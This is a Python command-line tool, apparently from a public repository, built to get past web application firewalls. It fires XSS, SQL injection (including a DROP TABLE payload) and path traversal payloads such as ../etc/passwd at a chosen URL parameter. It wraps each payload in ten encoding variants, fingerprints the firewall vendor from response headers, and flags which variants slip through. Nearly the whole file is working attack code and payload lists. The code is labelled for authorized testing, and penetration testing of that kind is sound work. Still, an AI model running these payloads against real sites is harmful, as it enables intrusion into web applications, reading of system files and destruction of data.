#!/usr/bin/env python3
"""
WAF Bypass — Web Application Firewall Evasion Testing Tool
Tests WAF bypass techniques for XSS, SQLi, and path traversal payloads.
Author: Omar Khalid (amooryx) | github.com/amooryx/waf-bypass
AUTHORIZED USE ONLY — for authorized security testing and bug bounty.
"""

import argparse
import json
import sys
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

# Encoding/evasion wrappers
def encode_variants(payload: str) -> list[tuple[str, str]]:
    variants = [
        ("raw",         payload),
        ("url",         urllib.parse.quote(payload)),
        ("double_url",  urllib.parse.quote(urllib.parse.quote(payload))),
        ("html_ent",    payload.replace("<", "&lt;").replace(">", "&gt;")),
        ("null_byte",   payload + "%00"),
        ("case",        payload.swapcase()),
        ("tab",         payload.replace(" ", "\t")),
        ("newline",     payload.replace(" ", "\n")),
        ("comment_sql", payload.replace(" ", "/**/") if "SELECT" in payload.upper() else payload),
        ("unicode",     payload.replace("'", "’").replace("\"", "“")),
    ]
    return variants

XSS_BASE = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
]

SQLI_BASE = [
    "' OR '1'='1",
    "1' AND '1'='1' --",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' OR 1=1#",
]

PATH_BASE = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]

WAF_INDICATORS = [
    "403", "blocked", "forbidden", "security", "waf", "firewall",
    "cloudflare", "akamai", "imperva", "incapsula", "mod_security",
    "access denied", "request rejected",
]

def detect_waf(url: str) -> str | None:
    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "WAFBypass/1.0")
        with urllib.request.urlopen(req, timeout=10) as resp:
            server = resp.headers.get("Server", "")
            via    = resp.headers.get("Via", "")
            for ind in ["cloudflare", "akamai", "imperva", "sucuri"]:
                if ind.lower() in server.lower() or ind.lower() in via.lower():
                    return ind
    except Exception:
        pass
    return None

def test_payload(url: str, param: str, payload_name: str, payload: str,
                 variant_name: str, variant: str, timeout: float) -> dict:
    parsed  = urllib.parse.urlparse(url)
    qs      = urllib.parse.parse_qs(parsed.query)
    qs[param] = [variant]
    test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))
    req = urllib.request.Request(test_url)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(4096).decode(errors="ignore").lower()
            blocked = any(ind in body for ind in WAF_INDICATORS)
            return {
                "payload_type": payload_name, "variant": variant_name,
                "status": resp.status, "blocked": blocked,
                "bypassed": not blocked and resp.status < 400,
            }
    except urllib.error.HTTPError as e:
        return {"payload_type": payload_name, "variant": variant_name,
                "status": e.code, "blocked": e.code in (403, 406, 429), "bypassed": False}
    except Exception as ex:
        return {"payload_type": payload_name, "variant": variant_name,
                "error": str(ex), "blocked": False, "bypassed": False}

def main():
    parser = argparse.ArgumentParser(
        description="WAF Bypass — WAF Evasion Testing Tool (Authorized use only)",
    )
    parser.add_argument("url",         help="Target URL with a testable parameter")
    parser.add_argument("--param",     required=True, help="Parameter to inject payloads into")
    parser.add_argument("--type",      choices=["xss", "sqli", "path", "all"], default="all")
    parser.add_argument("--threads",   type=int, default=5)
    parser.add_argument("--timeout",   type=float, default=10)
    parser.add_argument("--out",       help="Output JSON file")
    args = parser.parse_args()

    waf = detect_waf(args.url)
    print(f"[*] WAF detected: {waf or 'Unknown/None'}")

    payloads = []
    if args.type in ("xss", "all"):
        payloads += [("XSS", p) for p in XSS_BASE]
    if args.type in ("sqli", "all"):
        payloads += [("SQLi", p) for p in SQLI_BASE]
    if args.type in ("path", "all"):
        payloads += [("PathTraversal", p) for p in PATH_BASE]

    jobs = []
    for ptype, pbase in payloads:
        for vname, variant in encode_variants(pbase):
            jobs.append((ptype, pbase, vname, variant))

    print(f"[*] Testing {len(jobs)} payload/variant combinations ...")
    results  = []
    bypasses = []
    with ThreadPoolExecutor(max_workers=args.threads) as exe:
        futures = {exe.submit(test_payload, args.url, args.param,
                              ptype, pbase, vname, variant, args.timeout): (ptype, vname)
                   for ptype, pbase, vname, variant in jobs}
        for fut in futures:
            r = fut.result()
            results.append(r)
            if r.get("bypassed"):
                bypasses.append(r)
                print(f"  [!!!] BYPASS: {r['payload_type']} via {r['variant']} (status={r['status']})")

    print(f"\n[*] {len(bypasses)}/{len(jobs)} bypasses found")
    if args.out:
        with open(args.out, "w") as f:
            json.dump({"waf": waf, "results": results, "bypasses": bypasses}, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
